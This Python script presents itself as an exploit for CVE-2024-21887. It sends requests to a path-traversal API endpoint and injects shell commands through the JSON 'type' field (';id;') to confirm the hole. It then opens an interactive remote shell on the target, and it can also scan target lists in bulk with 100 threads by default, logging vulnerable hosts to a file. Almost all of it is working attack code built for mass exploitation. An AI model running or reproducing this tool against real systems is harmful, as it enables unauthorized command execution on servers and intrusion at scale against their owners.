import json
import urllib3
import requests
import argparse

from rich.console import Console
from alive_progress import alive_bar
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CVE_2024_21887:
    def __init__(self, base_url):
        self.base_url = base_url
        self.console = Console()
        self.session = requests.Session()
        self.session.trust_env = False

    def send_backup_code_request(self, type_value="id"):
        data = {"type": f";{type_value};"}
        url = f"{self.base_url}/api/v1/totp/user-backup-code/%2E%2E/%2E%2E/system/maintenance/archiving/cloud-server-test-connection"
        try:
            response = self.session.post(url, json=data, verify=False, timeout=10)
            if response.headers.get("Content-Type") == "application/json":
                try:
                    response_json = response.json()
                    if "error" in response_json:
                        return response_json["error"]
                except json.JSONDecodeError:
                    pass
            return None
        except requests.exceptions.RequestException as e:
            pass

    def check_vulnerability(self):
        error_message = self.send_backup_code_request()
        if error_message:
            self.console.print(
                f"[bold green][+] {self.base_url} is vulnerable - [/bold green][bold yellow]{error_message}[/bold yellow]"
            )

        return error_message

    def interactive_shell(self):
        session = PromptSession(InMemoryHistory())
        self.console.print(
            f"[bold yellow][!] Shell is ready, please type your commands UwU[/bold yellow]"
        )
        while True:
            try:
                cmd = session.prompt(HTML("<ansired><b># </b></ansired>"))
                match cmd.lower():
                    case "exit":
                        break
                    case "clear":
                        self.console.clear()
                    case _:
                        response = self.send_backup_code_request(cmd)
                        if response:
                            self.console.print(response)
            except KeyboardInterrupt:
                break


def process_url(url, output_file=None):
    scanner = CVE_2024_21887(url)
    if scanner.check_vulnerability():
        if output_file:
            with open(output_file, "a") as outfile:
                outfile.write(url + "\n")
        return url
    return None


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-21887 Exploit Script. This script is designed to detect and interact with systems vulnerable to CVE-2024-21887."
    )
    parser.add_argument(
        "-u",
        "--url",
        help="Specify a single URL to scan. Use this mode for a focused scan on one target.",
    )
    parser.add_argument(
        "-f",
        "--file",
        help="Specify a file path containing a list of URLs for bulk scanning. Each URL should be on a new line.",
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=100,
        help="Set the number of concurrent threads for bulk scanning. Default is 100.",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Specify a file path to save the URLs that are found to be vulnerable. Results are appended to this file in real time.",
    )

    args = parser.parse_args()

    match args:
        case args if args.url:
            scanner = CVE_2024_21887(args.url)
            if scanner.check_vulnerability():
                scanner.interactive_shell()

        case args if args.file:
            with open(args.file) as file:
                urls = file.read().splitlines()
                with alive_bar(len(urls), enrich_print=False) as bar:
                    with ThreadPoolExecutor(max_workers=args.threads) as executor:
                        futures = [
                            executor.submit(process_url, url, args.output)
                            for url in urls
                        ]
                        for future in as_completed(futures):
                            future.result()
                            bar()
            if args.output:
                print(f"Vulnerable URLs saved to {args.output}")

        case _:
            parser.print_help()


if __name__ == "__main__":
    main()
